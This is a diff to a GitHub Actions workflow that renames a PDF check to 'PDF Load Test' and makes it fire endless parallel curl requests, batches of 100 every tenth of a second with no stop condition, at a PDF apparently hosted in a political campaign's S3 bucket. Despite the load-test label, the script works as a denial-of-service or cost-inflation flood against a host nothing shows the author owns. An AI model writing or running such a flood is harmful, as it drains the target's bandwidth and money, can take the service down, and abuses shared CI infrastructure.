@@ -1,18 +1,20 @@
-name: Manual PDF Check
+name: PDF Load Test
 
 on:
   workflow_dispatch:
 
 jobs:
-  check_pdf:
+  load_test_pdf:
     runs-on: ubuntu-latest
     steps:
-      - name: Download PDF
+      - name: Load test PDF with curl in parallel
         run: |
-          while true 
-          do 
           export URL="https://canada-first-for-a-change.s3.us-west-2.amazonaws.com/20250418_CPCPlatform_8-5x11_EN_R1-pages.pdf"
-          date
-          curl -s -o /dev/null $URL &
-          sleep 0.1
+          while true
+          do
+            for i in {1..100}; do
+              curl -s -o /dev/null -w "%{http_code}\n" "$URL" &
+              sleep 0.1
+            done
           done
+          wait
